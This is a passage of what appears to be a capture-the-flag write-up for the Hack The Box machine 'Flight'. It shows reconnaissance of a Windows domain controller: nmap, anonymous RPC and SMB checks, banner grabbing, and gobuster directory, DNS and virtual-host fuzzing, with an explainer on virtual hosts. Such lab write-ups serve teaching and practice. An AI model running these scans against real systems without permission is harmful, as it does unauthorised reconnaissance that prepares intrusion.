</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="m">88</span>/tcp<span class="w">   </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2025</span>-08-20<span class="w"> </span><span class="m">23</span>:48:02Z<span class="o">)</span>
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="m">135</span>/tcp<span class="w">  </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="m">139</span>/tcp<span class="w">  </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="m">389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>flight.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="m">445</span>/tcp<span class="w">  </span>open<span class="w">  </span>microsoft-ds?
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="m">464</span>/tcp<span class="w">  </span>open<span class="w">  </span>kpasswd5?
</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="m">593</span>/tcp<span class="w">  </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="m">636</span>/tcp<span class="w">  </span>open<span class="w">  </span>tcpwrapped
</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="m">3268</span>/tcp<span class="w"> </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>flight.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="m">3269</span>/tcp<span class="w"> </span>open<span class="w">  </span>tcpwrapped
</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>G0<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>
</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>Host<span class="w"> </span>script<span class="w"> </span>results:
</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a><span class="p">|</span>_clock-skew:<span class="w"> </span>6h59m59s
</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a><span class="p">|</span><span class="w"> </span>smb2-security-mode:
</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="p">|</span><span class="w">   </span><span class="m">3</span>:1:1:
</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a><span class="p">|</span><span class="w"> </span>smb2-time:
</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a><span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2025</span>-08-20T23:48:07
</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a><span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a>
</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>&lt;https://nmap.org/submit/&gt;<span class="w"> </span>.
</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">53</span>.34<span class="w"> </span>seconds
</span></code></pre></div>
<p>Interesting, we see port 80 is open, but first lets look at some other services.</p>
<h2 id="rpc-enumeration">RPC enumeration</h2>
<h3 id="anonymous-logon">Anonymous logon</h3>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-N<span class="w"> </span>flight.htb
</span></code></pre></div>
<p>access denied when typing any command</p>
<h2 id="smb-enumeration">SMB enumeration</h2>
<h3 id="anonymous-logon_1">Anonymous logon</h3>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>smbclient<span class="w"> </span>-N<span class="w"> </span>-L<span class="w"> </span>flight.htb
</span></code></pre></div>
<p>no shares found</p>
<h2 id="web-app-inspection">Web app inspection</h2>
<p>This is the <code>home</code> page</p>
<p><img alt="image.png" src="../MediaFiles/flight_image1.png" /></p>
<p>By clicking on any button and page i see no results or redirects… thats strange</p>
<h3 id="banner-grabbing">Banner grabbing</h3>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>whatweb<span class="w"> </span>flight.htb
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>http://flight.htb<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="w"> </span>OK<span class="o">]</span><span class="w"> </span>Apache<span class="o">[</span><span class="m">2</span>.4.52<span class="o">]</span>,<span class="w"> </span>Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>,<span class="w"> </span>HTML5,<span class="w"> </span>HTTPServer<span class="o">[</span>Apache/2.4.52<span class="w"> </span><span class="o">(</span>Win64<span class="o">)</span><span class="w"> </span>OpenSSL/1.1.1m<span class="w"> </span>PHP/8.1.1<span class="o">]</span>,<span class="w"> </span>IP<span class="o">[</span><span class="m">10</span>.129.148.8<span class="o">]</span>,<span class="w"> </span>JQuery<span class="o">[</span><span class="m">1</span>.4.2<span class="o">]</span>,<span class="w"> </span>OpenSSL<span class="o">[</span><span class="m">1</span>.1.1m<span class="o">]</span>,<span class="w"> </span>PHP<span class="o">[</span><span class="m">8</span>.1.1<span class="o">]</span>,<span class="w"> </span>Script<span class="o">[</span>text/javascript<span class="o">]</span>,<span class="w"> </span>Title<span class="o">[</span>g0<span class="w"> </span>Aviation
</span></code></pre></div>
<p>Okay, we got some information there, but nothing stands out, lets move on with further enumeration of the web app</p>
<h2 id="web-app-enumeration">Web app enumeration</h2>
<h3 id="domain-enumeration">Domain enumeration</h3>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-e<span class="w"> </span>-t50<span class="w"> </span>-x<span class="w"> </span>php,txt,html<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>-u<span class="w"> </span>flight.htb
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="o">===============================================================</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Gobuster<span class="w"> </span>v3.6
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@firefart<span class="o">)</span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="o">===============================================================</span>
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Url:<span class="w">                     </span>http://flight.htb
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Method:<span class="w">                  </span>GET
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">                 </span><span class="m">50</span>
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">                </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Negative<span class="w"> </span>Status<span class="w"> </span>codes:<span class="w">   </span><span class="m">404</span>
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>Agent:<span class="w">              </span>gobuster/3.6
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Extensions:<span class="w">              </span>txt,html,php
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Expanded:<span class="w">                </span><span class="nb">true</span>
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">                 </span><span class="nv">10s</span>
</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="o">===============================================================</span>
</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>Starting<span class="w"> </span>gobuster<span class="w"> </span><span class="k">in</span><span class="w"> </span>directory<span class="w"> </span>enumeration<span class="w"> </span><span class="nv">mode</span>
</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="o">===============================================================</span>
</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>http://flight.htb/images<span class="w">               </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">333</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://flight.htb/images/<span class="o">]</span>
</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>http://flight.htb/index.html<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">7069</span><span class="o">]</span>
</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>http://flight.htb/.html<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">299</span><span class="o">]</span>
</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>http://flight.htb/Images<span class="w">               </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">333</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://flight.htb/Images/<span class="o">]</span>
</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a>http://flight.htb/css<span class="w">                  </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">330</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://flight.htb/css/<span class="o">]</span>
</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>http://flight.htb/Index.html<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">7069</span><span class="o">]</span>
</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a>http://flight.htb/js<span class="w">                   </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">329</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://flight.htb/js/<span class="o">]</span>
</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a>http://flight.htb/licenses<span class="w">             </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">418</span><span class="o">]</span>
</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a>http://flight.htb/examples<span class="w">             </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">503</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">399</span><span class="o">]</span>
</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a>http://flight.htb/IMAGES<span class="w">               </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">333</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://flight.htb/IMAGES/<span class="o">]</span>
</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a>http://flight.htb/%20<span class="w">                  </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">299</span><span class="o">]</span>
</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a>http://flight.htb/INDEX.html<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">7069</span><span class="o">]</span>
</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a>http://flight.htb/*checkout*<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">299</span><span class="o">]</span>
</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a>http://flight.htb/*checkout*.txt<span class="w">       </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">299</span><span class="o">]</span>
</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a>http://flight.htb/*checkout*.php<span class="w">       </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">299</span><span class="o">]</span>
</span><span id="__span-8-32"><a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a>http://flight.htb/*checkout*.html<span class="w">      </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">299</span><span class="o">]</span>
</span><span id="__span-8-33"><a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a>http://flight.htb/CSS<span class="w">                  </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">330</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://flight.htb/CSS/<span class="o">]</span>
</span><span id="__span-8-34"><a id="__codelineno-8-34" name="__codelineno-8-34" href="#__codelineno-8-34"></a>http://flight.htb/JS<span class="w">                   </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">329</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://flight.htb/JS/<span class="o">]</span>
</span></code></pre></div>
<p>Nothing too interesting here.. next i will search for subdomains</p>
<h3 id="subdomain-enumeration">Subdomain enumeration</h3>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>gobuster<span class="w"> </span>dns<span class="w"> </span>-d<span class="w"> </span>flight.htb<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt<span class="w"> </span>-i<span class="w"> </span>–wildcard
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="o">===============================================================</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>Gobuster<span class="w"> </span>v3.6
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@firefart<span class="o">)</span>
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="o">===============================================================</span>
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Domain:<span class="w">     </span>flight.htb
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">    </span><span class="m">10</span>
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Show<span class="w"> </span>IPs:<span class="w">   </span><span class="nb">true</span>
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">    </span>1s
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">   </span>/usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="o">===============================================================</span>
</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>Starting<span class="w"> </span>gobuster<span class="w"> </span><span class="k">in</span><span class="w"> </span>DNS<span class="w"> </span>enumeration<span class="w"> </span><span class="nv">mode</span>
</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="o">===============================================================</span>
</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>Progress:<span class="w"> </span><span class="m">49928</span><span class="w"> </span>/<span class="w"> </span><span class="m">49929</span><span class="w"> </span><span class="o">(</span><span class="m">100</span>.00%<span class="o">)</span>
</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="o">===============================================================</span>
</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="nv">Finished</span>
</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="o">===============================================================</span>
</span></code></pre></div>
<p>No subdomains found</p>
<p>hm after many hours of searching through the web app, i found nothing. Then by doing some research about web app enumeration i came accross some terms i did not know and havent seen before, like virtual hosts, so lets look if these exist in our occassion:</p>
<h2 id="virtual-host-enumeration">Virtual host enumeration</h2>
<h3 id="what-is-virtual-host">What is virtual host?</h3>
<p><code>virtual hosting</code> is the ability of web servers to distinguish between multiple websites or applications sharing the same IP address.</p>
<h3 id="subdomains-vs-vhosts">Subdomains vs VHosts</h3>
<ul>
<li><strong>Subdomains</strong> are part of a domain name (like <code>blog.example.com</code>) and are managed in <strong>DNS</strong>. They help organize services (blog, shop, mail, etc.).</li>
<li><strong>Virtual Hosts (VHosts)</strong> are <strong>web server configurations</strong> that tell the server how to handle different domain names or subdomains on the same IP.</li>
</ul>
<p>Even if a domain/subdomain doesn’t exist in DNS, you can still access it by manually mapping it in your <strong>hosts file</strong>.</p>
<p>Attackers and pentesters use <strong>VHost fuzzing</strong> to find hidden or internal subdomains/VHosts by trying different names against a target IP.</p>
<table>
<thead>
<tr>
<th>Feature</th>
<th>Subdomains</th>
<th>Virtual Hosts (VHosts)</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Definition</strong></td>
<td>Extensions of a main domain (e.g., <code>blog.example.com</code>).</td>
<td>Web server configurations for handling multiple sites on one IP.</td>
</tr>
<tr>
<td><strong>Where Defined</strong></td>
<td>DNS system (domain records).</td>
<td>Web server (Apache, Nginx, IIS, etc.).</td>
</tr>
<tr>
<td><strong>Purpose</strong></td>
<td>Organize services/sections of a website.</td>
<td>Allow hosting of multiple websites/apps on one server.</td>
</tr>
<tr>
<td><strong>Dependency</strong></td>
<td>Requires a DNS record (unless added manually in hosts file).</td>
<td>Requires web server configuration (may or may not have DNS).</td>
</tr>
<tr>
<td><strong>Examples</strong></td>
<td><code>shop.example.com</code>, <code>mail.example.com</code>.</td>
<td><code>example.com</code> and <code>dev.example.com</code> on same IP but separate configs.</td>
</tr>
<tr>
<td><strong>Accessibility</strong></td>
<td>Public if DNS record exists, private if hidden.</td>
<td>Public if DNS points to it, otherwise can still exist internally.</td>
</tr>
<tr>
<td><strong>Discovery</strong></td>
<td>Found via DNS enumeration.</td>
<td>Found via VHost fuzzing (testing hostnames on an IP).</td>
</tr>
</tbody>
</table>
<p>For example:</p>
<ul>
<li>A single server with IP <code>192.168.1.10</code></li>
<li>Can serve <code>example.com</code> <strong>and</strong> <code>blog.example.com</code> <strong>and</strong> <code>shop.com</code> — all on the same machine.</li>
</ul>
<p>Lets perform vhost enumeration using gobuster</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>gobuster<span class="w"> </span>vhost<span class="w"> </span>-u<span class="w"> </span>http://flight.htb<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>--append-domain
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="o">===============================================================</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>Gobuster<span class="w"> </span>v3.6
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@firefart<span class="o">)</span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="o">===============================================================</span>
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Url:<span class="w">             </span>http://flight.htb
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Method:<span class="w">          </span>GET
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">         </span><span class="m">10</span>
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">        </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>Agent:<span class="w">      </span>gobuster/3.6
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">         </span>10s
</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Append<span class="w"> </span>Domain:<span class="w">   </span><span class="nb">true</span>
</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="o">===============================================================</span>
</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>Starting<span class="w"> </span>gobuster<span class="w"> </span><span class="k">in</span><span class="w"> </span>VHOST<span class="w"> </span>enumeration<span class="w"> </span><span class="nv">mode</span>
</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="o">===============================================================</span>
</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>Found:<span class="w"> </span><span class="err">&#39;</span>.flight.htb<span class="w"> </span>Status:<span class="w"> </span><span class="m">400</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">326</span><span class="o">]</span>
